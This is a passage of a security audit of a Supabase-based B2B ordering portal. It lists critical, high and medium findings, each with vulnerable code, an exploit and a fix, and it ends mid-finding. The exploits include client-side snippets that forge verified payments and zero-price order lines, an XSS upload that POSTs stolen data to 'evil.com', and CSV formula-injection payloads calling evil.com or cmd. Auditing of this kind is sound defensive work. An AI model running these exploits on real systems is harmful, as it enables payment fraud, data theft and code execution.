# Security Audit — Rasheed B2B Ordering Portal

**Branch:** `system-simplified`
**Date:** 2026-04-13
**Method:** Four parallel read-only audit agents across independent domains (auth/API routes, Supabase RLS/DB, input validation/injection, business logic/pricing). Findings deduplicated and consolidated.

---

## Executive summary

| Severity | Count | Blocker for production? |
|---|---|---|
| Critical | 1 | Yes |
| High | 8 | Yes |
| Medium | 15 | Yes (ideally) |
| Low | 11 | No |

**Headline risk — attack chain:** three High findings combine into a critical chain. The buyer `INSERT` policies on `order_items` and `payments` (H1/H2) let any logged-in buyer directly forge verified payments and arbitrary-priced line items via the anon Supabase client in devtools, completely bypassing the (otherwise well-written) checkout server action. Nothing in the server code prevents this because the protection was intended to live in RLS — and the RLS is too permissive.

**Biggest surprise:** checkout pricing is actually solid. The server discards every client-supplied price field and re-fetches all values from the `products` table and `tenant_config.vat_rate`. The real attack surface is RLS policies that let buyers write directly to the database via the anon client, entirely bypassing your validated server actions.

---

## CRITICAL

### [C1] `is_admin()` / `get_app_role()` are `SECURITY DEFINER` with no pinned `search_path`

- **File:** `supabase/init.sql:104-121`
- **SQL:**
```sql
CREATE OR REPLACE FUNCTION public.get_app_role()
RETURNS public.app_role
LANGUAGE sql
STABLE
SECURITY DEFINER
AS $$
  SELECT (auth.jwt() ->> 'app_role')::public.app_role;
$$;

CREATE OR REPLACE FUNCTION public.is_admin()
RETURNS boolean
LANGUAGE sql
STABLE
SECURITY DEFINER
AS $$
  SELECT public.get_app_role() = 'admin';
$$;
```
- **Vulnerability:** Both functions execute with the privileges of the function owner (typically `postgres`/`supabase_admin`) but have no pinned `search_path`. Every RLS policy in the database calls `is_admin()`, so this is the single most security-critical function in the schema. Without `SET search_path`, a session that controls its own search path can shadow the `public.app_role` cast or related resolution and trick the definer context into returning `'admin'`. The `public` schema is writable by `authenticated` in Supabase by default unless explicitly revoked.
- **Exploit:** A logged-in buyer runs `SET search_path TO malicious_schema, public; SELECT public.is_admin();`. If they have CREATE on any schema in the search path, they can drop a shadow cast or wrapper in that path that the definer-context call resolves first. Even if no working exploit lands today, this is a Critical-by-policy hardening gap flagged by the Supabase linter (`function_search_path_mutable`) and becomes a CVE the moment Postgres relaxes operator-resolution rules.
- **Fix:**
```sql
ALTER FUNCTION public.get_app_role() SET search_path = public, pg_temp;
ALTER FUNCTION public.is_admin()     SET search_path = public, pg_temp;
-- Defence in depth:
REVOKE CREATE ON SCHEMA public FROM authenticated, anon;
```

---

## HIGH

### [H1] Buyer INSERT policy on `order_items` permits post-checkout tampering

- **File:** `supabase/init.sql:1000-1008`
- **SQL:**
```sql
CREATE POLICY "buyers_insert_order_items"
  ON public.order_items FOR INSERT TO authenticated
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM public.orders o
      WHERE o.id = order_items.order_id
        AND o.profile_id = auth.uid()
    )
  );
```
- **Vulnerability:** The policy permits a buyer to INSERT a row into `order_items` for ANY order they own, at any time, including orders that are already `confirmed` / `fulfilled` / `cancelled`. There is no check on `orders.status` and no restriction on price columns. The `validate_line_total` trigger only enforces internal arithmetic consistency (`qty × price = total`); it does NOT verify `unit_price` against the products table. Combined with the buyer-readable `cost_price` exposure in the order_items table, a buyer can bypass the atomic checkout RPC entirely.
- **Exploit:** From devtools using the anon client:
```js
await supabase.from('order_items').insert({
  order_id: '<my-own-confirmed-order-uuid>',
  sku: 'CHEAT', product_name: 'Free Stuff',
  unit_price: 0, quantity: 1000, line_total: 0, pack_size: 1
});
```
Or the inflation variant for refund/credit fraud: `unit_price: 1000000, quantity: 1, line_total: 1000000`. The INSERT succeeds because `validate_line_total` accepts `0 × 1000 × 1 = 0` and the RLS policy only checks order ownership.
- **Fix:**
```sql
DROP POLICY "buyers_insert_order_items" ON public.order_items;
-- Buyers must NEVER insert order_items directly. All inserts go through
-- create_order_atomic() which runs as service_role.
REVOKE INSERT, UPDATE, DELETE ON public.order_items FROM authenticated, anon;
```

### [H2] Buyer INSERT policy on `payments` permits forging verified payments

- **File:** `supabase/init.sql:1029-1037`
- **SQL:**
```sql
CREATE POLICY "buyers_insert_own_payments"
  ON public.payments FOR INSERT TO authenticated
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM public.orders o
      WHERE o.id = payments.order_id
        AND o.profile_id = auth.uid()
    )
  );
```
- **Vulnerability:** The `WITH CHECK` only ensures the payment belongs to a buyer-owned order. It does not:
  - bound `amount` to `<= orders.total_amount`
  - prevent setting `status = 'verified'` directly on insert
  - prevent setting `verified_by` to a real admin's profile id
  - prevent inserts against `orders.status = 'cancelled'` or already-paid orders
- **Exploit:** Buyer uses the anon client:
```js
await supabase.from('payments').insert({
  order_id: '<own order>',
  amount: 99999,
  status: 'verified',
  verified_by: '<known admin profile id>',
  proof_url: 'https://attacker.tld/forged.pdf'
});
```
The row is now indistinguishable from a real verified EFT. Any admin dashboard query joining `payments` to `orders` and showing latest verified payment will display this as legitimate. The 30-day-account credit-balance reconciliation may also pick it up.
- **Fix:**
```sql
DROP POLICY "buyers_insert_own_payments" ON public.payments;
-- Payment submissions must go through a server action that uses adminClient.

-- If buyer-side inserts must remain, lock the columns:
CREATE POLICY "buyers_insert_own_payments" ON public.payments
  FOR INSERT TO authenticated
  WITH CHECK (
    EXISTS (
      SELECT 1 FROM public.orders o
      WHERE o.id = payments.order_id
        AND o.profile_id = auth.uid()
        AND o.payment_status = 'unpaid'
    )
    AND status = 'pending'
    AND verified_by IS NULL
    AND verified_at IS NULL
    AND payment_method = 'eft'
  );
```

### [H3] `uploadProductImageAction` — no size cap, spoofable MIME, client-controlled filename extension

- **File:** `src/app/actions/admin.ts:604-645`
- **Code:**
```ts
const file = formData.get("file") as File | null;
if (!file || file.size === 0) return { error: "No file provided." };

const ALLOWED_MIME_TYPES = ["image/jpeg", "image/png", "image/webp"];
if (!ALLOWED_MIME_TYPES.includes(file.type)) {
  return { error: "Only JPEG, PNG, and WebP images are allowed." };
}

const ext = file.name.split(".").pop()?.toLowerCase() ?? "jpg";
const uniqueName = `${Date.now()}-${Math.random().toString(36).slice(2)}.${ext}`;
```
- **Vulnerability:** Three compounding flaws:
  1. **No max file size server-side.** Client enforces 2 MB in `ProductDrawer.tsx:144` only. A direct call accepts arbitrary size → storage/bandwidth DoS and cost amplification.
  2. **`file.type` is browser-supplied** and trivially spoofable (`new File([...], "evil.svg", { type: "image/png" })`). No magic-byte check.
  3. **`ext` is user-controlled.** `file.name.split(".").pop()` accepts anything (`a.html`, `a.svg`). Storage object key becomes `products/...html`. Combined with #2, upload `payload.html` with spoofed `type: 'image/png'` — MIME check passes, file saved with `.html` extension, served from Supabase storage public CDN with `Content-Type: text/html`.
- **Exploit:**
```js
const f = new File(
  ["<script>fetch('/api/...').then(r=>r.text()).then(t=>fetch('//evil.com',{method:'POST',body:t}))</script>"],
  "logo.html",
  { type: "image/png" }
);
const fd = new FormData(); fd.append("file", f);
await uploadProductImageAction(fd);
// returns { url: "https://<proj>.supabase.co/storage/v1/object/public/product-images/products/...html" }
```
Send link to an admin who is logged in → stored XSS in same-site context (cookies, CSRF tokens). The size DoS alone (#1) is already high-impact for a B2B portal.
- **Fix:**
```ts
const MAX_BYTES = 2 * 1024 * 1024;
const ALLOWED_MIME_TYPES = ["image/jpeg", "image/png", "image/webp"];

if (file.size > MAX_BYTES) return { error: "Image must be 2MB or smaller." };
if (!ALLOWED_MIME_TYPES.includes(file.type)) return { error: "Only JPEG, PNG, WebP allowed." };

// Validate magic bytes
const buf = Buffer.from(await file.arrayBuffer());
const isJpeg = buf[0] === 0xff && buf[1] === 0xd8;
const isPng  = buf[0] === 0x89 && buf[1] === 0x50 && buf[2] === 0x4e && buf[3] === 0x47;
const isWebp = buf.slice(0,4).toString() === "RIFF" && buf.slice(8,12).toString() === "WEBP";
if (!(isJpeg || isPng || isWebp)) return { error: "File is not a valid image." };

// Server-generated extension only — never trust the client's filename
const safeExt = isJpeg ? "jpg" : isPng ? "png" : "webp";
const uniqueName = `${Date.now()}-${crypto.randomUUID()}.${safeExt}`;
```
Also drop `image/svg+xml` from the bucket's `allowed_mime_types` (see M8).

### [H4] Email verification enforced only by Supabase project setting, not application code

- **File:** `src/app/actions/auth.ts:67-92` and `:239` (`adminLoginAction`)
- **Code:**
```ts
const supabase = await createClient();
const { error } = await supabase.auth.signInWithPassword({ email, password });

if (error) {
  if (error.code === "email_not_confirmed") {
    return { error: "Please verify your email address before signing in." };
  }
  return { error: "Invalid email or password." };
}

const { data: { user } } = await supabase.auth.getUser();
if (user) { ... }
```
- **Vulnerability:** `loginAction` relies entirely on Supabase returning `error.code === "email_not_confirmed"`. This only fires when the "Confirm email" toggle is ON in the Supabase Auth settings. If anyone toggles it off (operator error, staging→prod config drift, platform default change), unconfirmed users can log in silently with no second gate. There is no defensive `if (!user.email_confirmed_at)` check anywhere in `loginAction`, `getSession`, or `(portal)/layout.tsx`. `adminLoginAction` inherits the same assumption.
- **Exploit:** Attacker registers with any arbitrary email, skips the verification link, and immediately logs in. They land on `/dashboard` with a fully authenticated Supabase session. Registration assigns role `buyer_default` to new accounts, so they can browse the catalogue, place orders, and trigger outbound email flows.
- **Fix:**
```ts
const { data: { user } } = await supabase.auth.getUser();
if (!user) return { error: "Authentication failed." };

if (!user.email_confirmed_at) {
  await supabase.auth.signOut();
  return { error: "Please verify your email address before signing in." };
}
```
Apply the same `email_confirmed_at` assertion inside `adminLoginAction:245`, and ideally inside `getSession()` in `src/lib/auth/session.ts:57` so that a forged session cookie cannot load a verified user either.

### [H5] Proxy does not enforce `role === 'admin'` for `/admin/*`

- **File:** `src/proxy.ts:62-74`
- **Code:**
```ts
if (pathname.startsWith(ADMIN_PREFIX)) {
  const supabase = createMiddlewareClient(request, response);
  const { data: { user } } = await supabase.auth.getUser();

  if (!user) {
    return NextResponse.redirect(new URL("/admin/login", request.url));
  }

  return response;
}
```
- **Vulnerability:** The proxy gates `/admin/*` on the presence of ANY Supabase Auth user, not on the `admin` role. Role enforcement lives only in `(admin)/layout.tsx`. Because self-signup is enabled (`signUpAction`), producing a non-admin Supabase Auth user is trivial. A future refactor that removes or loosens the layout check (or a nested page omitting the guard) immediately exposes admin views — there is no second belt. RSC streaming, `loading.tsx`, `error.tsx` and other files co-located in `(admin)` can leak data before `layout.tsx` finishes. In addition, a future file at `src/app/admin/newfeature/page.tsx` (outside the route group) will NOT be wrapped by the admin layout, yet the proxy will still treat it as `/admin/*` and let any authenticated user through.
- **Exploit:** Attacker registers via `/register`, confirms their email, then navigates to `/admin/products` or `/admin/clients`. The proxy sees `user !== null` and lets the request through.
- **Fix:**
```ts
if (pathname.startsWith(ADMIN_PREFIX)) {
  const supabase = createMiddlewareClient(request, response);
  const { data: { user } } = await supabase.auth.getUser();
  if (!user) return NextResponse.redirect(new URL("/admin/login", request.url));

  const { data: profile } = await adminClient
    .from("profiles")
    .select("role")
    .eq("auth_user_id", user.id)
    .single();

  if (profile?.role !== "admin") {
    return NextResponse.redirect(new URL("/dashboard", request.url));
  }

  return response;
}
```
Alternative: mint a signed cookie containing `role` at login time and verify it in the proxy with `jose` (same pattern as `BUYER_SESSION_COOKIE`). Also add a CI check that every `/admin/**` route lives inside `src/app/(admin)/`.

### [H6] `seed_test_users.sql` creates hard-coded admin credentials

- **File:** `supabase/scripts/seed_test_users.sql:30-72`, `supabase/scripts/create_verified_user.sql:1-78`
- **SQL:**
```sql
INSERT INTO auth.users (..., email, encrypted_password, email_confirmed_at, raw_user_meta_data, ...)
VALUES (..., 'admin@rasheed-test.local',
        crypt('TestAdmin123!', gen_salt('bf')),
        NOW(),
        '{"role": "admin", ...}', ...);
```
- **Vulnerability:** Three fixed-UUID users with publicly-known credentials are created by a committed-adjacent script. The admin row uses `raw_user_meta_data.role = 'admin'`, which fires `handle_new_admin_user()` and creates a privileged profile. `email_confirmed_at = NOW()` bypasses verification. Currently UNTRACKED (git status shows `?? supabase/scripts/`), so not yet committed — but one accident sends `admin@rasheed-test.local / TestAdmin123!` to the public repository. The partner script `delete_test_users.sql` is fail-open — forget to run it, stay compromised.
- **Exploit:** Attacker reads the repo, tries `admin@rasheed-test.local / TestAdmin123!` against the production login page. If the script has been run on prod and `delete_test_users.sql` has not been run after, full admin compromise. The workflow "seed → test → delete" fails open if the delete step is skipped.
- **Fix:**
  1. Add `supabase/scripts/` to `.gitignore` **now**, before any accidental commit.
  2. Gate every script with an environment assertion:
```sql
DO $$
BEGIN
  IF current_setting('app.environment', true) IS DISTINCT FROM 'local' THEN
    RAISE EXCEPTION 'seed_test_users may only run with app.environment=local';
  END IF;
END $$;
```
  3. Ideally move `supabase/scripts/` out of the repo entirely.

### [H7] `tenant_config` SELECT policy leaks internal staff emails

- **File:** `supabase/init.sql:826-828`
- **SQL:**
```sql
CREATE POLICY "all_read_tenant_config"
  ON public.tenant_config FOR SELECT TO authenticated
  USING (true);
```
- **Vulnerability:** Every authenticated buyer can `SELECT *` from `tenant_config`. The table holds bank details (intentionally shown on the EFT payment screen) but ALSO holds `email_from_address`, `email_reply_to`, `dispatch_email`, and `report_emails`. None of those should be visible to buyers — they enable targeted phishing of admin staff and impersonation of the supplier's outbound address.
- **Exploit:** Logged-in buyer from browser console:
```js
await supabase.from('tenant_config').select('email_from_address,email_reply_to,dispatch_email,report_emails');
```
Now has a list of internal email addresses and can spear-phish dispatch staff with a forged "delivery update" email.
- **Fix:**
```sql
REVOKE SELECT ON public.tenant_config FROM authenticated;
CREATE VIEW public.tenant_config_public AS
  SELECT id, business_name, trading_name, logo_url, website_url,
         vat_number, vat_rate,
         bank_name, bank_account_holder, bank_account_number,
         bank_branch_code, bank_account_type, bank_reference_prefix,
         payment_terms_days, support_phone, support_email, footer_text
  FROM public.tenant_config;
GRANT SELECT ON public.tenant_config_public TO authenticated;
ALTER TABLE public.tenant_config FORCE ROW LEVEL SECURITY;
```
Update `src/app/(portal)/checkout/payment/page.tsx:34` to read from the view.

### [H8] `orders` SELECT policy exposes `notes` and `assigned_to` to buyers

- **File:** `supabase/init.sql:969-983`
- **SQL:**
```sql
CREATE POLICY "select_orders"
  ON public.orders FOR SELECT TO authenticated
  USING (profile_id = auth.uid() OR public.is_admin());
```
- **Vulnerability:** The SELECT policy returns ALL columns of an order to the buyer who owns it, including `notes` (intended as admin-only internal notes — the sibling table `order_notes` exists for buyer-visible notes) and `assigned_to` (which admin employee handles the order). Internal staff routing should not be a buyer-readable field.
- **Exploit:** Buyer runs `select id, notes, assigned_to from orders where profile_id = auth.uid();` and sees free-text staff comments like "this customer is a payment risk" or "assigned to Sarah, she handles disputes". Reputational and labour-relations risk, plus potential POPIA exposure.
- **Fix:**
```sql
REVOKE SELECT ON public.orders FROM authenticated;
GRANT SELECT (
  id, reference_number, profile_id, status, payment_method,
  subtotal, discount_amount, vat_amount, total_amount,
  shipping_address, buyer_reference, delivery_instructions,
  order_notes, payment_status, confirmed_at, fulfilled_at,
  cancelled_at, created_at, updated_at
) ON public.orders TO authenticated;
```
Admin-side full-column reads continue via `adminClient` which bypasses RLS.

---

## MEDIUM

### [M1] Rate limiter fails open silently in production

- **File:** `src/lib/rate-limit.ts:15-22`, `:52-56`
- **Code:**
```ts
if (!url || !token) {
  console.warn("[rate-limit] Upstash Redis env vars not set. Rate limiting is DISABLED.");
  return createNoopLimiter();
}
// ...
} catch (err) {
  console.error("[rate-limit] Redis error, allowing request:", err);
  return { allowed: true };
}
```
- **Vulnerability:** The limiter fails open in two places: (1) startup when `UPSTASH_REDIS_REST_URL` / `UPSTASH_REDIS_REST_TOKEN` are not set, and (2) at request time on any Redis error. In production, a missing env var or credential rotation silently disables rate limiting for `loginAction`, `signUpAction`, `forgotPasswordAction`, and `adminLoginAction` — the only signal is a `console.warn`.
- **Exploit:** Deploy to Vercel without `UPSTASH_REDIS_REST_URL`. Rate limiter logs a warning but keeps returning `{ allowed: true }`. Attacker runs unthrottled credential-stuffing against `/login`. Against `adminLoginAction` this is especially painful — any success grants full admin privileges.
- **Fix:**
```ts
function getLimiter(): Ratelimit {
  if (buyerLoginLimiter) return buyerLoginLimiter;
  const url = process.env.UPSTASH_REDIS_REST_URL;
  const token = process.env.UPSTASH_REDIS_REST_TOKEN;

  if (process.env.NODE_ENV === "production" && (!url || !token)) {
    throw new Error("Rate limiter Redis env vars missing in production");
  }
  if (!url || !token) return createNoopLimiter(); // dev only
  // ...
}

// And in checkLoginRateLimit:
catch (err) {
  console.error("[rate-limit] Redis error:", err);
  if (process.env.NODE_ENV === "production") {
    return { allowed: false, retryAfter: 30 }; // fail closed
  }
  return { allowed: true };
}
```

### [M2] Rate-limit key falls back to `unknown:${email}` and IPs are user-spoofable

- **File:** `src/app/actions/auth.ts:55-60`, `:111-117`, `:159-164`, `:226-231`
- **Code:**
```ts
const rawIp =
  headerStore.get("x-real-ip")?.trim() ||
  headerStore.get("x-forwarded-for")?.split(",")[0]?.trim();
const ip = rawIp && rawIp.length > 0 ? rawIp : `unknown:${email}`;
const rateLimit = await checkLoginRateLimit(ip);
```
- **Vulnerability:** `x-forwarded-for` is user-controllable when origin is directly reachable. Fallback to `unknown:${email}` lets each distinct email get a fresh bucket. An attacker rotating `X-Forwarded-For: a.b.c.<i>` per request gets a fresh rate-limit bucket for each and bypasses the 5-per-60-second limit.
- **Exploit:** Run credential stuffing against `/login` by injecting a fresh `X-Forwarded-For` header per request. No lockout triggers because the key changes.
- **Fix:**
```ts
// Use a trusted source of the client IP
const ip = getTrustedClientIp(headerStore); // via @vercel/functions `ip()` or RFC 7239 `Forwarded`
const key = `login:${ip}:${email.toLowerCase()}`;
const rateLimit = await checkLoginRateLimit(key);
```
Also add a per-email bucket (`login-email:${email}`) with a slower window (e.g. 10/hour) so distributed attacks against a single account are throttled.

### [M3] Dead `verifyBuyerSession` path reuses `SUPABASE_JWT_SECRET`

- **File:** `src/lib/auth/buyer.ts:82-108`, `src/lib/auth/session.ts:37-52`
- **Code:**
```ts
export async function verifyBuyerSession(token: string) {
  const { payload } = await jwtVerify(token, getJwtSecret(), { algorithms: ["HS256"] });
  if (typeof payload.sub !== "string" || typeof payload.app_role !== "string" ||
      typeof payload.account_number !== "string") return null;
  return { profileId: payload.sub, role: payload.app_role as AppRole,
           accountNumber: payload.account_number, token };
}
```
- **Vulnerability:** `createBuyerSession` is exported but has zero call sites (verified via grep). The verification path is still live in the proxy and in `getSession()`. The HMAC secret is the SAME secret Supabase uses to sign its own access tokens. If it ever leaks (Sentry capture, log export, CI artefact), an attacker forges `{ sub: <victim profile id>, app_role: "buyer_default", account_number: "X" }` and gets full portal access to any buyer. A future contributor calling `createBuyerSession` in a new flow re-opens a very permissive path without realising.
- **Exploit:** Given `SUPABASE_JWT_SECRET`, forge `SignJWT({ sub: "<victim profile id>", app_role: "buyer_default", account_number: "RAS-00001" }).setProtectedHeader({ alg: "HS256" }).sign(secret)` and set it as the `sb-buyer-session` cookie. Every portal query scopes by `session.profileId`, so the attacker now sees/downloads/operates as that profile.
- **Fix:** Delete `createBuyerSession`, `verifyBuyerSession`, `BUYER_SESSION_COOKIE` usage in `proxy.ts` and `session.ts`, and the cookie-clearing code in `auth.ts:268-271`. If the flow is needed later, use a separate `BUYER_JWT_SECRET` with explicit `iss`/`aud` claims.

### [M4] `checkoutAction` does not enforce credit limit for `buyer_30_day`

- **File:** `src/app/actions/checkout.ts` (no `checkCreditStatus` import); `src/lib/credit/checkCreditStatus.ts` (only called from `src/app/(admin)/admin/page.tsx:201`)
- **Vulnerability:** A `buyer_30_day` can place orders regardless of outstanding balance, credit limit, or overdue status. The credit check runs only when an admin views the Approve button. Combined with uncapped `quantity` (L1), one buyer with R50k credit can submit multiple R1M+ orders, spamming supplier emails and leaking proforma PDFs before any admin intervenes.
- **Exploit:** Buyer X has `credit_limit: 50000` and `outstanding: 45000`. They submit a R500_000 order. Checkout succeeds; order is `pending`, emails go out, admin sees the credit-blocked indicator — but the buyer has already generated invoices, dispatch emails, and internal noise. If the proforma PDF includes cost/margin data, that has already leaked.
- **Fix:**
```ts
if (session.role === "buyer_30_day") {
  const credit = await checkCreditStatus(session.profileId);
  const prospective = credit.outstanding + totalAmount;
  if (credit.blocked) {
    return { error: "Your account is on hold. Please contact support." };
  }
  if (credit.creditLimit != null && prospective > credit.creditLimit) {
    return { error: "This order exceeds your available credit." };
  }
}
```
Run AFTER `computeOrderTotals` but BEFORE the RPC call.

### [M5] `markPaymentSubmittedAction` — no state guard, no dedup, no UUID/length validation

- **File:** `src/app/actions/checkout.ts:364-409`
- **Code:**
```ts
const orderId = formData.get("orderId") as string | null;
if (!orderId) return { error: "Missing order ID." };

const buyerReference = (formData.get("buyer_reference") as string | null)?.trim() || null;
// ...
await adminClient.from("payments").insert({
  order_id: order.id,
  payment_method: order.payment_method as "eft" | "30_day_account",
  amount: Number(order.total_amount),
  status: "pending",
});
```
- **Vulnerability:** Four issues: (1) no UUID validation on `orderId`; (2) no check of `orders.status` — buyer can submit payment on confirmed/cancelled orders; (3) no check for an existing pending payment row — 50 clicks create 50 rows; (4) `buyer_reference` has no server-side length cap (client enforces 100 only). A 1 MB reference crashes PDF rendering.
- **Exploit:**
```js
const fd = new FormData();
fd.set("orderId", "<real order uuid>");
fd.set("buyer_reference", "A".repeat(1_000_000));
await markPaymentSubmittedAction(fd);
// Store 1MB in orders.buyer_reference; future PDF render OOMs or breaks layout

// Or scripted double-submission:
for (let i = 0; i < 50; i++) await markPaymentSubmittedAction(fd);
```
- **Fix:**
```ts
const Schema = z.object({
  orderId: z.string().uuid(),
  buyer_reference: z.string().trim().max(100).optional().nullable(),
});
const parsed = Schema.safeParse({
  orderId: formData.get("orderId"),
  buyer_reference: formData.get("buyer_reference") || undefined,
});
if (!parsed.success) return { error: parsed.error.issues[0].message };

const { data: order } = await adminClient.from("orders")
  .select("id, status, total_amount, payment_method, profile_id")
  .eq("id", parsed.data.orderId).eq("profile_id", session.profileId)
  .eq("status", "pending").single();
if (!order) return { error: "Order not found or already submitted." };

const { count } = await adminClient.from("payments")
  .select("id", { head: true, count: "exact" })
  .eq("order_id", order.id).eq("status", "pending");
if ((count ?? 0) > 0) return { error: "Payment already submitted." };
```

### [M6] `checkoutAction` has no idempotency token

- **File:** `src/app/actions/checkout.ts:165`
- **Vulnerability:** No client nonce, no server dedup, no check against "an identical pending order exists for this buyer in the last N seconds". Double-click / network retry / script creates 2+ identical orders. The atomic RPC makes each order internally consistent but does not dedupe against other orders.
- **Exploit:** Double-click "Place Order" in slow-network conditions → two pending orders, two proforma PDFs, two supplier emails.
- **Fix:** Accept an opaque `clientOrderId` (UUID generated client-side when the user clicks Place Order) and add a UNIQUE-indexed `orders.client_submission_id` column. Inside `create_order_atomic`: `INSERT ... ON CONFLICT (client_submission_id) DO NOTHING RETURNING id`. If no row returned, look up and return the existing id.

### [M7] Rate limiting only applied to auth actions — checkout, admin mutations, invoice route are uncapped

- **Files:** `src/app/actions/checkout.ts`, `src/app/api/invoice/[orderId]/route.ts`, `src/app/actions/admin.ts`
- **Vulnerability:** The Upstash limiter is only called from the 4 auth actions. No limiter on `checkoutAction`, `markPaymentSubmittedAction`, `reorderAction`, `saveAddressAction`, `inviteClientAction`, `exportOrdersCsvAction`, or the invoice PDF route. A compromised buyer credential spams orders, invites, CSV exports (tenant-wide financial data), and PDF generation (CPU-heavy on Vercel).
- **Exploit:** (a) Attacker scripts 10_000 `GET /api/invoice/<orderId>` → every hit renders a PDF in-process → Vercel function concurrency saturates → legit users see 504s. (b) Attacker scripts 500 `checkoutAction` calls → 500 supplier emails fire (Resend quota), 500 pending orders jam the Order Ledger.
- **Fix:** Add the limiter to every mutating server action and the invoice route, keyed on `session.profileId`:
```ts
const rl = await checkActionRateLimit(`checkout:${session.profileId}`); // 10 per 60s
if (!rl.allowed) return { error: "Too many orders. Please wait." };
```

### [M8] `product-images` storage bucket allows SVG and has zero explicit object policies

- **File:** `supabase/init.sql:1091-1099`
- **SQL:**
```sql
INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
VALUES ('product-images','product-images', true, 10485760,
        ARRAY['image/jpeg','image/png','image/webp','image/gif','image/svg+xml']);
```
- **Vulnerability:** Two parts:
  1. `image/svg+xml` is allowed. SVG can carry inline `<script>` and execute in the browser context. Even on a separate origin, SVG XSS can scrape session cookies or leak via referer.
  2. No explicit `storage.objects` policies. `public = true` handles reads via public CDN, but writes rely on service-role implicit access. A future migration adding `INSERT TO authenticated` would ship silently without a failing test.
- **Exploit:** (a) Admin accidentally uploads a malicious SVG; attacker phishes another admin to click it → same-origin XSS. (b) A future migration permissively opens `storage.objects` INSERT and no negative test catches it.
- **Fix:**
```sql
UPDATE storage.buckets
   SET allowed_mime_types = ARRAY['image/jpeg','image/png','image/webp']
 WHERE id = 'product-images';

CREATE POLICY "product_images_admin_write"
  ON storage.objects FOR INSERT TO authenticated
  WITH CHECK (bucket_id = 'product-images' AND public.is_admin());

CREATE POLICY "product_images_admin_update"
  ON storage.objects FOR UPDATE TO authenticated
  USING (bucket_id = 'product-images' AND public.is_admin());

CREATE POLICY "product_images_admin_delete"
  ON storage.objects FOR DELETE TO authenticated
  USING (bucket_id = 'product-images' AND public.is_admin());
```

### [M9] `payments.proof_url` references a bucket no migration creates

- **File:** `supabase/init.sql:471-486`
- **Vulnerability:** The schema names a storage URL column for proof-of-payment uploads, but no migration creates a `payment-proofs` bucket and no policies exist for it. Either (a) the feature is unimplemented and the column is dead, (b) the bucket is being created manually in the Supabase dashboard with unknown defaults, or (c) buyers' proof-of-payment documents are uploaded into the public `product-images` bucket — which exposes financial documents at unauthenticated public CDN URLs.
- **Exploit:** If (c), an attacker who scrapes URLs via `payments.proof_url` (visible to buyers via `select_payments` on their own orders) reads OTHER buyers' proofs via direct CDN access.
- **Fix:**
```sql
INSERT INTO storage.buckets (id, name, public, file_size_limit, allowed_mime_types)
VALUES ('payment-proofs','payment-proofs', false, 5242880,
        ARRAY['image/jpeg','image/png','image/webp','application/pdf'])
ON CONFLICT (id) DO NOTHING;

CREATE POLICY "buyer_upload_own_proof"
  ON storage.objects FOR INSERT TO authenticated
  WITH CHECK (
    bucket_id = 'payment-proofs'
    AND (storage.foldername(name))[1] = auth.uid()::text
  );

CREATE POLICY "buyer_read_own_proof"
  ON storage.objects FOR SELECT TO authenticated
  USING (
    bucket_id = 'payment-proofs'
    AND ((storage.foldername(name))[1] = auth.uid()::text OR public.is_admin())
  );
```
Read proofs server-side via `adminClient.storage.from('payment-proofs').createSignedUrl(...)` — never public URLs.

### [M10] CSV formula injection in `exportOrdersCsvAction` and `generateDailyReportCsv`

- **Files:** `src/app/actions/admin.ts:585-590`, `src/lib/reports/daily-report.ts:8-13`
- **Code:**
```ts
function csvEsc(value: string): string {
  if (value.includes(",") || value.includes('"') || value.includes("\n")) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}
```
- **Vulnerability:** The escape function only protects against CSV parsing breakage, not formula injection (CWE-1236). A buyer registering `business_name = '=HYPERLINK("https://evil.com/exfil?d="&A1,"Click")'` or `=cmd|'/c calc'!A1` triggers DDE/formula execution when an admin opens the daily report in Excel. Business name flows into CSV alongside account_number, email, product_name, SKU.
- **Exploit:** Buyer signs up with `business_name = "=cmd|'/c calc'!A1"`, places an order, admin downloads the daily report CSV, opens in Excel → Excel prompts to enable DDE, then runs `calc.exe` (or any command). In Google Sheets the `HYPERLINK` variant exfiltrates other cells via referer.
- **Fix:**
```ts
function csvEsc(value: string): string {
  let v = value ?? "";
  if (/^[=+\-@\t\r]/.test(v)) v = `'${v}`;
  if (v.includes(",") || v.includes('"') || v.includes("\n")) {
    return `"${v.replace(/"/g, '""')}"`;
  }
  return v;
}
```
Apply to EVERY cell. `daily-report.ts` currently escapes some but misses `accNo`/`bizName` formula triggers; `admin.ts:585` misses `sku`.

### [M11] `createProductAction` / `updateProductAction` accept `Infinity` price and >100% discount

- **File:** `src/app/actions/admin.ts:651-892`
- **Code:**
```ts
const priceRaw = parseFloat(formData.get("price") as string);
// ...
if (!sku || !name || isNaN(priceRaw) || priceRaw < 0) {
  return { error: "SKU, name, and a valid price are required." };
}
```
- **Vulnerability:** `parseFloat("Infinity")` passes `isNaN` and `< 0` checks. Setting `price = Infinity` corrupts every downstream calculation. `discountValue` for percentage discounts is not capped at 100 — a 9999% discount inverts pricing. No max length on `sku`/`name`/`description`/`details` — a 1 MB `details` string blows up PDF rendering. `imageUrl` is taken straight from FormData and inserted into `product_images.url`, enabling Next/Image SSRF via arbitrary URLs.
- **Exploit:**
```js
const fd = new FormData();
fd.set("sku", "X"); fd.set("name", "X");
fd.set("price", "Infinity");
fd.set("pack_size", "1");
fd.set("discount_type", "percentage");
fd.set("discount_threshold", "1");
fd.set("discount_value", "999"); // 999% discount
await createProductAction(fd);
```
Now any cart line referencing this product computes a negative `lineTotal`, dragging the order subtotal negative and creating phantom credits at checkout.
- **Fix:** Use Zod with `.coerce.number().finite().nonnegative().max(1e7)` on prices, `.int().positive().max(10_000)` on pack_size/stock, `.max(200)` on name, `.max(5000)` on details, and a `.superRefine` that asserts percentage discounts ≤ 100.

### [M12] `inviteClientAction` / `updateClientAction` accept `Infinity` for `credit_limit`

- **File:** `src/app/actions/admin.ts:927-1024`
- **Vulnerability:** No length caps on `contactName`/`businessName`/`notes`/`phone`/`vat_number`/`account_number`. `parseFloat` silently accepts `Infinity`. `parseInt(formData.get("payment_terms_days"), 10)` accepts negatives. The email regex is permissive and doesn't bound length.
- **Exploit:**
```js
const fd = new FormData();
fd.set("id", "<existing client id>");
fd.set("credit_limit", "-99999999");
fd.set("available_credit", "Infinity");
fd.set("payment_terms_days", "-30");
await updateClientAction(fd);
```
`checkCreditStatus` does `available_credit - used` → with `Infinity` always passes → unlimited credit.
- **Fix:**
```ts
